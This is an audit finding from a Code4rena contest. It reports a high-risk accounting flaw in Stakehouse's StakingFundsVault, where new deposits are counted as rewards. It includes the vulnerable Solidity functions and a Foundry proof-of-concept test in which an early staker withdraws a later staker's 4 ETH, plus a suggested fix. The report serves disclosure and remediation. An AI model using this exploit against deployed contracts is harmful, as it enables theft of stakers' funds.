## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- H-18

# [Old stakers can steal deposits of new stakers in `StakingFundsVault`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/255) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63


# Vulnerability details

## Impact
Stakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.
## Proof of Concept
`StakingFundsVault` is designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders ([StakingFundsVault.sol#L215-L231](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L215-L231)):
```solidity
if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {
    // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract
    // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched
    _claimFundsFromSyndicateForDistribution(
        liquidStakingNetworkManager.syndicate(),
        _blsPubKeys
    );

    // Distribute ETH per LP
    updateAccumulatedETHPerLP();
}

// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH
LPToken token = lpTokenForKnot[_blsPubKeys[i]];
require(address(token) != address(0), "Invalid BLS key");
require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Last transfer too recent");
_distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);
```

The `updateAccumulatedETHPerLP` function calculates the reward amount per LP token share ([SyndicateRewardsProcessor.sol#L76](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76)):
```solidity
function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {
    if (_numOfShares > 0) {
        uint256 received = totalRewardsReceived();
        uint256 unprocessed = received - totalETHSeen;

        if (unprocessed > 0) {
            emit ETHReceived(unprocessed);

            // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later
            accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;

            totalETHSeen = received;
        }
    }
}
```

And the `_distributeETHRewardsToUserForToken` function distributes rewards to LP token holders ([SyndicateRewardsProcessor.sol#L51](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51)):
```solidity
function _distributeETHRewardsToUserForToken(
    address _user,
    address _token,
    uint256 _balance,
    address _recipient
) internal {
    require(_recipient != address(0), "Zero address");
    uint256 balance = _balance;
    if (balance > 0) {
        // Calculate how much ETH rewards the address is owed / due 
        uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
        if (due > 0) {
            claimed[_user][_token] = due;

            totalClaimed += due;

            (bool success, ) = _recipient.call{value: due}("");
            require(success, "Failed to transfer");

            emit ETHDistributed(_user, _recipient, due);
        }
    }
}
```

To ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a deposit [StakingFundsVault.sol#L123](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123)).

However, this rewards accounting algorithm also counts deposited tokens:
1. to stake tokens, users call `depositETHForStaking` and send ETH ([StakingFundsVault.sol#L113](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L113));
1. `updateAccumulatedETHPerLP` is called in the function ([StakingFundsVault.sol#L123](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123));
1. `updateAccumulatedETHPerLP` checks the balance of the contract, which *already includes the new staked amount* ([SyndicateRewardsProcessor.sol#L78](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L78), [SyndicateRewardsProcessor.sol#L94](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L94)).
1. the staked amount is then counted in the `accumulatedETHPerLPShare` variable ([SyndicateRewardsProcessor.sol#L85](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85)), which is used to calculate the reward amount per LP share ([SyndicateRewardsProcessor.sol#L61](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61)).

This allows the following attack:
1. a user stakes 4 ETH to a BLS key;
1. the validator with the BLS key gets registered and its derivative tokens get minted;
1. a new user stakes some amount to a different BLS key;
1. the first user calls `claimRewards` and withdraws the stake of the new user.

```solidity
// test/foundry/StakingFundsVault.t.sol
function testStealingOfDepositsByOldStakers_AUDIT() public {
    // Resetting the mocks, we need real action.
    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 0);
    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 0);
    liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne, false);
    liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo, false);

    // Aliasing accounts for better readability.
    address nodeRunner = accountOne;
    address alice = accountTwo;
    address alice2 = accountFour;
    address bob = accountThree;

    // Node runner registers two BLS keys.
    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFive);
    registerSingleBLSPubKey(nodeRunner, blsPubKeyTwo, accountFive);

    // Alice deposits to the MEV+fees vault of the first key.
    maxETHDeposit(alice, getBytesArrayFromBytes(blsPubKeyOne));

    // Someone else deposits to the savETH vault of the first key.
    liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyOne, 24 ether);

    // The first validator is registered and the derivatives are minted.
    assertEq(vault.totalShares(), 0);
    stakeAndMintDerivativesSingleKey(blsPubKeyOne);
    assertEq(vault.totalShares(), 4 ether);

    // Warping to pass the lastInteractedTimestamp checks.
    vm.warp(block.timestamp + 1 hours);

    // The first key cannot accept new deposits since the maximal amount was deposited
    // and the validator was register. The vault however can still be used to deposit to
    // other keys.

    // Bob deposits to the MEV+fees vault of the second key.
    maxETHDeposit(bob, getBytesArrayFromBytes(blsPubKeyTwo));
    assertEq(address(vault).balance, 4 ether);
    assertEq(bob.balance, 0);

    // Alice is claiming rewards for the first key.
    // Notice that no rewards were distributed to the MEV+fees vault of the first key.
    assertEq(alice2.balance, 0);
    vm.startPrank(alice);
    vault.claimRewards(alice2, getBytesArrayFromBytes(blsPubKeyOne));
    vm.stopPrank();

    LPToken lpTokenBLSPubKeyOne = vault.lpTokenForKnot(blsPubKeyOne);

    // Alice has stolen the Bob's deposit.
    assertEq(alice2.balance, 4 ether);
    assertEq(vault.claimed(alice, address(lpTokenBLSPubKeyOne)), 4 ether);
    assertEq(vault.claimed(alice2, address(lpTokenBLSPubKeyOne)), 0);

    assertEq(address(vault).balance, 0);
    assertEq(bob.balance, 0);
}
```
## Tools Used
Manual review
## Recommended Mitigation Steps
Consider excluding newly staked amounts in the `accumulatedETHPerLPShare` calculations.